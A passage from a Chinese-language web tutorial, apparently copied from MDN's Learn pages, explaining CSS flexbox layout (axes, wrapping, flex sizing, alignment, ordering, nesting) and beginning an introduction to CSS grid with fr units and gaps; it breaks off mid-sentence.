项沿交叉轴排列，在这种情况下，高度称为交叉尺寸。"></p><ul><li><strong>主轴</strong>（main axis）是沿着 flex 元素放置的方向延伸的轴（比如页面上的横向的行、纵向的列）。该轴的开始和结束被称为 <strong>main start</strong> 和 <strong>main end</strong>。</li><li><strong>交叉轴</strong>（cross axis）是垂直于 flex 元素放置方向的轴。该轴的开始和结束被称为 <strong>cross start</strong> 和 <strong>cross end</strong>。</li><li>设置了 <code>display: flex</code> 的父元素，被称之为 <strong>flex 容器（flex container）。</strong></li><li>在 flex 容器中表现为弹性的盒子的元素被称之为 <strong>flex 项</strong>（<strong>flex item</strong>）</li></ul><p>了解这些术语以便你阅读后续章节。如果你对使用的任何术语感到困惑，你可以随时返回这里。</p><h4 id="列还是行？"><a href="#列还是行？" class="headerlink" title="列还是行？"></a>列还是行？</h4><p>弹性盒子提供了 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex-direction"><code>flex-direction</code></a> 这样一个属性，它可以指定主轴的方向（弹性盒子子类放置的地方）——它默认值是 <code>row</code>，这使得它们在按你浏览器的默认语言方向排成一排（在英语&#x2F;中文浏览器中是从左到右）。</p><p>尝试将以下声明添加到 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/section">&#96;&#96;</a> 元素的 css 规则里：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">flex-direction</span>: column;<br></code></pre></td></tr></table></figure><p>你会看到，这会将那些元素设置为列布局，就像我们添加这些 CSS 之前。在继续之前，请从示例中删除此规则。</p><p><strong>备注：</strong> 你还可以使用 <code>row-reverse</code> 和 <code>column-reverse</code> 值反向排列 flex 项。用这些值试试看吧！</p><h4 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h4><p>当你在布局中使用定宽或者定高的时候，可能会出现问题即处于容器中的弹性盒子子元素会溢出，破坏了布局。你可以看一下<a href="https://github.com/mdn/learning-area/blob/master/css/css-layout/flexbox/flexbox-wrap0.html">弹性盒子——wrap0.html</a> 示例（你也可以拷贝到本地），如下所示：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Flexbox/flexbox-example3.png" alt="简单弹性盒子示例，将所有 flex 项都布置在弹性容器的一行中。第八个 flex 项在浏览器窗口溢出，页面具有可见的水平和垂直滚动条，因为它无法容纳在窗口的宽度内，因为前七个 flex 项占用了视口中的可用空间。默认情况下，如果将弹性方向设置为行，浏览器会尝试将所有 flex 项放在一行中；如果弹性方向设置为列，则会尝试将所有 flex 项置于单列中。"></p><p>在这里我们看到，子代确实超出了它们的容器。解决此问题的一种方法是将以下声明添加到 section css 规则中：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">flex-<span class="hljs-keyword">wrap</span>: <span class="hljs-keyword">wrap</span><br></code></pre></td></tr></table></figure><p>同时，把以下规则也添加到 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/article"><code>&lt;article&gt;</code></a> 规则中：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">flex</span>: <span class="hljs-number">200px</span>;<br></code></pre></td></tr></table></figure><p>现在尝试一下吧；你会看到布局比原来好多了：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Flexbox/flexbox-example4.png" alt="flex 项在弹性容器中分多行排列。flex-wrap 属性在弹性容器中设置为“wrap”，如果上一行中的 flex 项在弹性容器外溢出，则弹性容器中显示新行中的 flex 项。每个 flex 项的宽度为 200 像素。所有物品都被拉伸到相同的高度，与内容最多的 flex 项一样高。"></p><p>我们现在有多个行。每行都安装了尽可能多的 flex 项。任何溢出都会向下移动到下一行。在 article 上设置的 <code>flex：200px</code> 声明意味着每个声明将至少为 200px 宽。我们稍后会更详细地讨论这个属性。你可能还注意到，最后一行上的最后几个项每个都变得更宽，以便把整个行填满。</p><p>但是这里我们可以做得更多。首先，改变 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex-direction"><code>flex-direction</code></a> 属性值为 <code>row-reverse</code>——你会看到仍然有多行布局，但是每一行元素排列的方向和原来是相反的了。</p><h4 id="flex-flow-缩写"><a href="#flex-flow-缩写" class="headerlink" title="flex-flow 缩写"></a>flex-flow 缩写</h4><p>到这里，应当注意到存在着 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex-direction"><code>flex-direction</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex-wrap"><code>flex-wrap</code></a>——的缩写 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex-flow"><code>flex-flow</code></a>。比如，你可以将</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">flex-direction</span>: row;<br><span class="hljs-attribute">flex-wrap</span>: wrap;<br></code></pre></td></tr></table></figure><p>替换为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">flex-flow</span>: row wrap;<br></code></pre></td></tr></table></figure><h4 id="flex-项的动态尺寸"><a href="#flex-项的动态尺寸" class="headerlink" title="flex 项的动态尺寸"></a>flex 项的动态尺寸</h4><p>现在让我们回到第一个例子，看看是如何控制 flex 项占用空间的比例的。打开你本地的 <a href="https://github.com/mdn/learning-area/blob/master/css/css-layout/flexbox/flexbox0.html">弹性盒子 0.html</a>，或者拷贝 <a href="https://github.com/mdn/learning-area/blob/master/css/css-layout/flexbox/flexbox1.html">弹性盒子 1.html</a> 作为新的开始（<a href="https://mdn.github.io/learning-area/css/css-layout/flexbox/flexbox1.html">查看线上</a>）。</p><p>第一步，将以下规则添加到 CSS 的底部：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">article</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是一个无单位的比例值，表示每个 flex 项沿主轴的可用空间大小。本例中，我们设置 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/article">&#96;&#96;</a> 元素的 flex 值为 1，这表示每个元素占用空间都是相等的，占用的空间是在设置 padding 和 margin 之后剩余的空间。因为它是一个比例，这意味着将每个 flex 项的设置为 400000 的效果和 1 的时候是完全一样的。</p><p>现在在上一个规则下添加：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-of-type</span>(<span class="hljs-number">3</span>) &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在当你刷新，你会看到第三个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/article">&#96;&#96;</a> 元素占用了两倍的可用宽度和剩下的一样——现在总共有四个比例单位可用。前两个 flex 项各有一个，因此它们占用每个可用空间的 1&#x2F;4。第三个有两个单位，所以它占用 2&#x2F;4 或者说是 1&#x2F;2 的可用空间。</p><p>你还可以指定 flex 的最小值。尝试修改现有的 article 规则：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">article</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span> <span class="hljs-number">200px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-of-type</span>(<span class="hljs-number">3</span>) &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">2</span> <span class="hljs-number">200px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这表示“每个 flex 项将首先给出 200px 的可用空间，然后，剩余的可用空间将根据分配的比例共享”。尝试刷新，你会看到分配空间的差别。</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Flexbox/flexbox-example1.png" alt="简单的 flexbox 示例，flex 容器中有三个 flex 项。所有 flex 项的最低宽度为 200 像素——使用“flex”设置。前两个 flex 项的 flex 值为 1，第三个项的 flex 值为 2。这会将弹性容器中的剩余空间分成 4 个比例单位。前两个 flex 项各分配一个单元，第三个 flex 项分配两个单元，使第三个 flex 项比宽度相同的其他两个更宽。"></p><p>弹性盒子的真正价值可以体现在它的灵活性&#x2F;响应性，如果你调整浏览器窗口的大小，或者增加一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/article"><code>&lt;artcle&gt;</code></a> 元素，这时的布局仍旧是好的。</p><h4 id="flex：缩写与全写"><a href="#flex：缩写与全写" class="headerlink" title="flex：缩写与全写"></a>flex：缩写与全写</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex"><code>flex</code></a> 是一个可以指定最多三个不同值的缩写属性：</p><ul><li>第一个就是上面所讨论过的无单位比例。可以单独指定全写 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex-grow"><code>flex-grow</code></a> 属性的值。</li><li>第二个无单位比例——<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex-shrink"><code>flex-shrink</code></a>——一般用于溢出容器的 flex 项。这指定了从每个 flex 项中取出多少溢出量，以阻止它们溢出它们的容器。这是一个相当高级的弹性盒子功能，我们不会在本文中进一步说明。</li><li>第三个是上面讨论的最小值。可以单独指定全写 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex-basis"><code>flex-basis</code></a> 属性的值。</li></ul><p>我们建议不要使用全写属性，除非你真的需要（比如要去覆盖之前写的）。使用全写会多写很多的代码，它们也可能有点让人困惑。</p><h4 id="水平和垂直对齐"><a href="#水平和垂直对齐" class="headerlink" title="水平和垂直对齐"></a>水平和垂直对齐</h4><p>还可以使用弹性盒子的功能让 flex 项沿主轴或交叉轴对齐。让我们一起看一下新例子——<a href="https://github.com/mdn/learning-area/blob/master/css/css-layout/flexbox/flex-align0.html">flex-align0.html</a>（<a href="https://mdn.github.io/learning-area/css/css-layout/flexbox/flex-align0.html">在线浏览</a>）——我们将会有一个整洁，灵活的按钮&#x2F;工具栏。此时，你看到了一个水平菜单栏，其中一些按钮卡在左上角，就像下面这样：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Flexbox/flexbox-example5.png" alt="带有 Smile、Laugh、Wink、Shrug &amp; Blush 标签的五个按钮排列在一个弹性容器中。按钮卡在左上角，看起来不整洁。"></p><p>首先，拷贝一份到本地。</p><p>然后，将下面的 CSS 添加到例子的底部：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: center;<br>  <span class="hljs-attribute">justify-content</span>: space-around;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Flexbox/flexbox_center_space-around.png" alt="带有 Smile、Laugh、Wink、Shrug &amp; Blush 标签的五个按钮排在一个弹性容器中。通过将对齐项属性设置为中心，flex 项位于横轴的中心。通过将 justify-content 属性设置为 space-around，flex 项沿着主轴均匀间隔。"></p><p>刷新一下页面，你就会看到这些按钮很好的垂直水平居中了。我们是通过下面所说的两个新的属性做到的。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-items"><code>align-items</code></a> 控制 flex 项在交叉轴上的位置。</p><ul><li>默认的值是 <code>stretch</code>，其会使所有 flex 项沿着交叉轴的方向拉伸以填充父容器。如果父容器在交叉轴方向上没有固定宽度（即高度），则所有 flex 项将变得与最长的 flex 项一样长（即高度保持一致）。我们的第一个例子在默认情况下得到相等的高度的列的原因。</li><li>在上面规则中我们使用的 <code>center</code> 值会使这些项保持其原有的高度，但是会在交叉轴居中。这就是那些按钮垂直居中的原因。</li><li>你也可以设置诸如 <code>flex-start</code> 或 <code>flex-end</code> 这样使 flex 项在交叉轴的开始或结束处对齐所有的值。查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-items"><code>align-items</code></a> 了解更多。</li></ul><p>你可以用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-self"><code>align-self</code></a> 属性覆盖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-items"><code>align-items</code></a> 的行为。比如，你可以这样：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">button</span><span class="hljs-selector-pseudo">:first</span>-child &#123;<br>  <span class="hljs-attribute">align-self</span>: flex-end;<br>&#125;<br></code></pre></td></tr></table></figure><p>！<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Flexbox/flexbox_first-child_flex-end.png">带有 Smile、Laugh、Wink、Shrug &amp; Blush 标签的五个按钮排在一个弹性容器中。除第一个项外，所有 flex 项都通过将对齐项属性设置为中心，位于十字轴的中心或垂直居中。第一项与交叉轴末端的弹性容器底部齐平，对齐自属性设置 flex 端。flex 项沿着容器的主轴或宽度均匀间隔。</a></p><p>去看看它产生的效果，然后删除它。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/justify-content"><code>justify-content</code></a> 控制 flex 项在主轴上的位置。</p><ul><li>默认值是 <code>flex-start</code>，这会使所有 flex 项都位于主轴的开始处。</li><li>你也可以用 <code>flex-end</code> 来让 flex 项到结尾处。</li><li><code>center</code> 在 <code>justify-content</code> 里也是可用的，可以让 flex 项在主轴居中。</li><li>而我们上面用到的值 <code>space-around</code> 是很有用的——它会使所有 flex 项沿着主轴均匀地分布，在任意一端都会留有一点空间。</li><li>还有一个值是 <code>space-between</code>，它和 <code>space-around</code> 非常相似，只是它不会在两端留下任何空间。</li></ul><p>在继续下面之前，多多使用提到过的属性吧，看看它们的效果。</p><h4 id="flex-项排序"><a href="#flex-项排序" class="headerlink" title="flex 项排序"></a>flex 项排序</h4><p>弹性盒子也有可以改变 flex 项的布局位置的功能，而不会影响到源顺序（即 dom 树里元素的顺序）。这也是传统布局方式很难做到的一点。</p><p>代码也很简单，将下面的 CSS 添加到示例代码下面。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">button</span><span class="hljs-selector-pseudo">:first</span>-child &#123;<br>  <span class="hljs-attribute">order</span>: <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>刷新下，然后你会看到“Smile”按钮移动到了主轴的末尾。下面我们谈下它实现的一些细节：</p><ul><li>所有 flex 项默认的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/order"><code>order</code></a> 值是 0。</li><li>order 值大的 flex 项比 order 值小的在显示顺序中更靠后。</li><li>相同 order 值的 flex 项按源顺序显示。所以假如你有四个元素，其 order 值分别是 2，1，1 和 0，那么它们的显示顺序就分别是第四，第二，第三，和第一。</li><li>第三个元素显示在第二个后面是因为它们的 order 值一样，且第三个元素在源顺序中排在第二个后面。</li></ul><p>你也可以给 order 设置负值使它们比值为 0 的元素排得更前面。比如，你可以设置“Blush”按钮排在主轴的最前面：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">button</span><span class="hljs-selector-pseudo">:last-child</span> &#123;<br>  <span class="hljs-attribute">order</span>: -<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="flex-嵌套"><a href="#flex-嵌套" class="headerlink" title="flex 嵌套"></a>flex 嵌套</h4><p>弹性盒子也能创建一些颇为复杂的布局。设置一个元素为 flex 项，那么他同样成为一个 flex 容器，它的孩子（直接子节点）也表现为弹性盒子。看一下 <a href="https://github.com/mdn/learning-area/blob/master/css/css-layout/flexbox/complex-flexbox.html">复杂弹性盒子.html</a>（<a href="https://mdn.github.io/learning-area/css/css-layout/flexbox/complex-flexbox.html">在线浏览</a>）。</p><p>这个例子的 HTML 是相当简单的。我们用一个<code>&lt;section&gt;</code>元素包含了三个<code> &lt;article&gt;</code>元素。第三个<code>&lt;article&gt;</code>元素包含了三个<code> &lt;div&gt;</code>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">section</span> - <span class="hljs-selector-tag">article</span><br>          <span class="hljs-selector-tag">article</span><br>          <span class="hljs-selector-tag">article</span> - <span class="hljs-selector-tag">div</span> - <span class="hljs-selector-tag">button</span><br>                    <span class="hljs-selector-tag">div</span>   <span class="hljs-selector-tag">button</span><br>                    <span class="hljs-selector-tag">div</span>   <span class="hljs-selector-tag">button</span><br>                          <span class="hljs-selector-tag">button</span><br>                          <span class="hljs-selector-tag">button</span><br></code></pre></td></tr></table></figure><p>现在让我们看一下布局用到的代码。</p><p>首先，我们设置 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/section"><code>section</code></a> 的子节点布局为弹性盒子。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">section</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面我们给<code>&lt;article&gt;</code>元素设置 flex 值。特别注意这里的第二条 CSS 规则——我们设置第三个<code> &lt;article&gt;</code>元素的子节点的布局同样为 flex，但是属性值为列布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">article</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span> <span class="hljs-number">200px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-of-type</span>(<span class="hljs-number">3</span>) &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">3</span> <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-flow</span>: column;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来，我们选择了第一个<code> &lt;div&gt;</code>。首先使用 flex: 1 100px; 简单的给它一个最小的高度 100px，然后设置它的子节点（<code>&lt;button&gt; </code>元素）为 flex 项。在这里我们将它们放在一个包装行（wrap row）中，使它们居中对齐，就像我们在前面看到的单个按钮示例中做的那样。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-of-type</span>(<span class="hljs-number">3</span>) <span class="hljs-selector-tag">div</span><span class="hljs-selector-pseudo">:first</span>-child &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span> <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-flow</span>: row wrap;<br>  <span class="hljs-attribute">align-items</span>: center;<br>  <span class="hljs-attribute">justify-content</span>: space-around;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后，我们给按钮设置大小，有意思的是我们给它一个值为 1 的 flex 属性。如果你调整浏览器窗口宽度，你会看到这是一个非常有趣的效果。按钮将尽可能占用最多的空间，尽可能多的堆在同一条线上，但是当它们不再适合在同一条线上，他们中的一些会到下一行去。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">button</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">5px</span>;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;<br>  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.5</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="跨浏览器兼容性"><a href="#跨浏览器兼容性" class="headerlink" title="跨浏览器兼容性"></a>跨浏览器兼容性</h4><p>大多数浏览器都支持弹性盒子，诸如 Firefox、Chrome、Opera、Microsoft Edge 和 IE 11，较新版本的 Android&#x2F;iOS 等等。但是你应该要意识到仍旧有被人使用的老浏览器不支持弹性盒子（或者支持，但是只是支持非常非常老版本的弹性盒子）。</p><p>虽然你只是在学习和实验，这不太要紧; 然而，如果你正在考虑在真实网站中使用弹性盒子，则需要进行测试，并确保在尽可能多的浏览器中你的用户体验仍然可以接受。</p><p>弹性盒子相较其他一些 CSS 特性可能更为棘手。例如，如果浏览器缺少 CSS 阴影，则该网站可能仍然可用。但是假如不支持弹性盒子功能就会完全打破布局，使其不可用。</p><p>我们在<a href="https://developer.mozilla.org/zh-CN/docs/Learn/Tools_and_testing/Cross_browser_testing">跨浏览器测试</a>模块中讨论了克服跨浏览器支持问题的策略。</p><h3 id="2-15-网格"><a href="#2-15-网格" class="headerlink" title="2.15 网格"></a>2.15 网格</h3><p>CSS 网格是一个用于 web 的二维布局系统。利用网格，你可以把内容按照行与列的格式进行排版。另外，网格还能非常轻松地实现一些复杂的布局。关于使用网格进行页面排版，这篇文章包含了你需要的一切知识。</p><h4 id="什么是网格布局？"><a href="#什么是网格布局？" class="headerlink" title="什么是网格布局？"></a>什么是网格布局？</h4><p>网格是由一系列水平及垂直的线构成的一种布局模式。根据网格，我们能够将设计元素进行排列，帮助我们设计一系列具有固定位置以及宽度的元素的页面，使我们的网站页面更加统一。</p><p>一个网格通常具有许多的<strong>列（column）</strong>与<strong>行（row）</strong>，以及行与行、列与列之间的间隙，这个间隙一般被称为<strong>沟槽（gutter）</strong>。</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Grids/grid.png" alt="img"></p><p><strong>备注：</strong> 任何有设计背景的人似乎都感到惊讶，CSS 没有内置的网格系统，而我们似乎使用各种次优方法来创建网格状的设计。正如你将在本文的最后一部分中发现的那样，这将被改变，但是你可能需要知道在未来一段时间内创建网格的现有方法。</p><h4 id="在-CSS-中创建自己的网格"><a href="#在-CSS-中创建自己的网格" class="headerlink" title="在 CSS 中创建自己的网格"></a>在 CSS 中创建自己的网格</h4><p>决定好你的设计所需要的网格后，你可以创建一个 CSS 网格版面并放入各类元素。我们先来看看网格的基础功能，然后尝试做一个简单的网格系统。</p><h4 id="定义一个网格"><a href="#定义一个网格" class="headerlink" title="定义一个网格"></a>定义一个网格</h4><p>和往常一样，你可以下载，然后在文本编辑器中打开并浏览教程的<a href="https://github.com/mdn/learning-area/blob/main/css/css-layout/grids/0-starting-point.html">起始文件</a>（你可以<a href="https://mdn.github.io/learning-area/css/css-layout/grids/0-starting-point.html">在这里查看实时的效果</a>）。你会看到一个带有容器的示例，容器中有一些子项。默认情况下，子项按照正常布局流自顶而下排布。在这篇教程的第一部分，我们会从这开始，通过对这个文件做一些改变，来了解网格是如何工作的。</p><p>首先，我们通过把容器的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/display"><code>display</code></a> 属性设置为 <code>grid</code> ,来定义一个网格。与弹性盒子一样，将父容器改为网格布局后，他的直接子项会变为网格项。把下面的 css 规则加到你的文件中。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta">.<span class="hljs-built_in">container</span> &#123;<br>  <span class="hljs-keyword">display</span>: grid;<br>&#125;<br></code></pre></td></tr></table></figure><p>与弹性盒子不同的是，在定义网格后，网页并不会马上发生变化。因为 <code>display: grid</code> 的声明只创建了一个只有一列的网格，所以子项还是会像正常布局流那样，自上而下、一个接一个的排布。</p><p>为了让我们的容器看起来更像一个网格，我们要给刚定义的网格加一些列。那就让我们加三个宽度为<code>200px</code>的列。当然，这里可以用任何长度单位，包括百分比。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">200px</span> <span class="hljs-number">200px</span> <span class="hljs-number">200px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在你的 CSS 中加入第二个规则。刷新页面后，你会看到子项们排进了新定义的网格中。</p><iframe class="sample-code-frame" title="定义一个网格 sample" id="frame_定义一个网格" width="100%" height="400" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Grids/_sample_.%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E7%BD%91%E6%A0%BC.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="使用-fr-单位的灵活网格"><a href="#使用-fr-单位的灵活网格" class="headerlink" title="使用 fr 单位的灵活网格"></a>使用 fr 单位的灵活网格</h4><p>除了长度和百分比，我们也可以用 <code>fr</code> 这个单位来灵活地定义网格的行与列的大小。这个单位代表网格容器中可用空间的一份，可能有点抽像，看看下面的例子吧。</p><p>使用下面的规则来修改你的网格轨道，创建 3 个宽度为 <code>1fr</code> 的列：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;<br>&#125;<br></code></pre></td></tr></table></figure><p>将窗口调窄（由于示例中设定了<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/max-width"><code>max-width</code></a>，可能需要很窄），你应该能看到每一列的宽度可以会随着可用空间变小而变小。<code>fr</code> 单位按比例划分了可用空间，如果没有理解，可以试着改一下数值，看看会发生什么，比如下面的代码：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">2</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个定义里，第一列被分配了 <code>2fr</code> 可用空间，余下的两列各被分配了 <code>1fr</code> 的可用空间，这会使得第一列的宽度更大。另外，<code>fr</code>可以与一般的长度单位混合使用。比如设置 <code>grid-template-columns: 300px 2fr 1fr</code>，那么第一列宽度是<code>300px</code>，剩下的两列会根据剩余的可用空间按比例分配。</p><iframe class="sample-code-frame" title="使用 fr 单位的灵活网格 sample" id="frame_使用_fr_单位的灵活网格" width="100%" height="400" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Grids/_sample_.%E4%BD%BF%E7%94%A8_fr_%E5%8D%95%E4%BD%8D%E7%9A%84%E7%81%B5%E6%B4%BB%E7%BD%91%E6%A0%BC.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p><strong>备注：</strong> <code>fr</code>单位分配的是<em>可用</em>空间而非<em>所有</em>空间，所以如果某一格包含的内容变多了，那么整个可用空间就会减少，可用空间是不包括那些已经确定被占用的空间的。</p><h4 id="网格间隙"><a href="#网格间隙" class="headerlink" title="网格间隙"></a>网格间隙</h4><p>使用 <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/column-gap"><code>grid-column-gap</code> (en-US)</a> 属性来定义列间隙；使用 <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/row-gap"><code>grid-row-gap</code> (en-US)</a> 来定义行间隙；使用 <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/gap"><code>grid-gap</code> (en-US)</a> 